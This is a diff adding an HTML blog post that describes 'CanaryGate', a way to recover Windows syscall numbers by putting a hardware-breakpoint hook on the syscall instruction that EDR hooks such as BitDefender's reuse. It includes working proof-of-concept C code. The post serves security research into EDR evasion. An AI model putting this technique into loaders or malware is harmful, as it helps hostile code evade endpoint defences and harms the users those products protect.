@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CanaryGate - A silly direct syscall method</title>
+<link rel="icon" type="image/png" href="../favicon-16x16.png" sizes="16x16" />
+<meta charset="utf-8">
+<style>
+	img {
+		display: block;
+		margin-left: auto;
+		margin-right: auto;
+		width: 60%;
+	}
+</style>
+</head>
+<body>
+<textarea theme="united" toc="true" style="display:none;">
+# CanaryGate - A silly direct syscall method
+
+I've been taking some [Sektor7](https://institute.sektor7.net) courses recently,
+and part of that involved learning about **Hells Gate**.
+
+Basically, Hells Gate is a memoization process that finds and caches important
+Windows syscall numbers at run-time. It places them into what they call a "VX
+Table". This is in contrast to tools like `SysWhispers` that create the table at
+compile-time and place it into the payload/loader binary.
+
+At run-time syscall numbers can be recovered using various techniques such as:
+
+1. Reading the syscall numbers from a "fresh copy" of NTDLL
+
+2. Creating a suspended process and reading the syscall numbers from the version
+   of NTDLL in that process (Perun's Fart)
+
+3. Taking advantage of predictable ordering in NTDLL exports as it relates to
+   the syscall numbers of the exports (Halo's Gate)
+
+In this blog post, I will describe yet another method for doing the recovery of
+syscall numbers, I call this technique **CanaryGate** though it likely has some
+other name that I'm not aware of.
+
+The project can be [found on GitHub here](https://github.com/cramppet/canary-gate)
+
+# TL;DR
+
+CanaryGate exploits a design flaw in certain EDRs (like BitDefender). The flaw
+is that the EDRs re-use the existing `syscall` instruction within the NTDLL
+stubs.
+
+This means that supposing you make an innocuous call to a hooked function, the
+hook logic will eventually result in the execution of the existing `syscall`
+instruction.
+
+Recall the way that syscalls are performed on Windows: the System Service Number
+(SSN) is stored within the `rax` register before the `syscall` instruction is
+executed.
+
+By hooking the existing `syscall` instruction, we can capture the moment after
+the EDR hook has executed. For the implementation of their hook to work, they
+must have loaded the SSN into `rax` at that point in time.
+
+# PoC code
+
+```c
+#include <stdio.h>
+#include <windows.h>
+#include <winternl.h>
+
+typedef NTSTATUS (NtQueryInformationProcess_t)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+typedef struct _hook { HANDLE hThread; void* addr; } hook_t;
+
+LONG Handler(PEXCEPTION_POINTERS args) {
+  PCONTEXT ctx = args->ContextRecord; 
+  PEXCEPTION_RECORD exc = args->ExceptionRecord;
+  if (exc->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+    printf("Handler caught exception: %p, RAX = 0x%llx\n", ctx->Rip, ctx->Rax);
+    ctx->Dr0 = 0;
+    ctx->Dr6 = 0;
+    ctx->Dr7 = 0;
+    return EXCEPTION_CONTINUE_EXECUTION;
+  }
+  return EXCEPTION_CONTINUE_SEARCH;
+}
+
+void set_hook(hook_t* args) {
+  CONTEXT ctx = {0};
+  ctx.ContextFlags = CONTEXT_ALL;
+  SuspendThread(args->hThread);
+  GetThreadContext(args->hThread, &ctx);
+  ctx.Dr0 = args->addr;
+  ctx.Dr6 = 0;
+  ctx.Dr7 = 1;
+  SetThreadContext(args->hThread, &ctx);
+  ResumeThread(args->hThread);
+}
+
+int main() {
+  HMODULE ntdll = GetModuleHandleA("NTDLL.DLL");
+  PBYTE func = GetProcAddress(ntdll, "NtQueryInformationProcess");
+  DWORD i = 0;
+  hook_t hook = {0};
+  
+  //
+  // Locate desired NTDLL function, we assume it has a "syscall" instruction
+  // preserved
+  //
+
+  while (1) {
+    if (func[i] == 0x0F && func[i+1] == 0x05) {
+      printf("Found syscall instruction at: %p\n", func + i);
+      hook.addr = func + i;
+      break;
+    }
+    printf("Byte value = 0x%x\n", func[i]);
+    i += 1;
+  }
+
+  //
+  // Get a non-pseudohandle for our current thread and add the exception handler
+  // (hook) to capture the RAX value after the EDR hook has executed
+  //
+
+  hook.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
+  AddVectoredExceptionHandler(1, Handler);
+
+  //
+  // Create another thread to create the hook in our thread context
+  //
+
+  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)set_hook, &hook, 0, NULL);
+  Sleep(10000);
+
+  //
+  // Make the "canary call" in order to reveal the syscall number
+  //
+
+  printf("Calling function...\n");
+
+  PROCESS_BASIC_INFORMATION info = {0};
+  ((NtQueryInformationProcess_t*)func)(-1, ProcessBasicInformation, &info, sizeof(PROCESS_BASIC_INFORMATION), NULL);
+
+  printf("Exiting...\n");
+
+  return 0;
+}
+```
+
+# Detailed Discussion
+
+The image shown below was run against the freeware version of the `BitDefender`
+AV/EDR tool. That implementation uses hooking on functions like
+`NtQueryInformationProcess`, their hooks are implemented such that they re-use
+the existing syscall and thus we can try to "doubly-hook" the call.
+
+![BitDefender Hook Implementation](./bitdefender-hook.png)
+
+Our PoC searches the memory of the NTDLL stub for `NtQueryInformationProcess`
+looking for the byte pattern of the `syscall` instruction (`0x0F05`). Once
+found, it uses an Intel hardware breakpoint via the x86_64 debug registers
+combined with a vectored exception handler to perform the hook.
+
+It's worth pointing out that this PoC is patchless so if the EDR performs a
+checksum on the doubly-hooked NTDLL stubs, they would not notice a difference.
+Still, hardware breakpoints are relatively easy to detect (you just have to
+examine the `CONTEXT` of the calling thread) so another mechanism would likely
+be better.
+
+Once the target is hooked, we perform a "canary call", we call the function with
+the most unsuspicious set of arguments we possibly can. The point of the call is
+to trigger the EDR hook, have it succeed, and eventually hit our secondary hook.
+
+You can see in the image that our call is made, our second hook is hit, and by
+examining the thread context when our second hook was hit, we were able to
+recover the syscall number of `NtQueryInformationProcess` as being `0x19`.
+
+What's left to turn this into a full implementation of direct syscalling is to
+simply re-use the code from Hell's Gate to build the VX table and then use it to
+perform syscalls directly. I've left this as an exercise for the reader ;)
+
+![Canary Gate Example](./canary-gate-1.png)
+
+</textarea>
+</body>
+<script src="../vendor/strapdown.min.js"></script>
+</html>
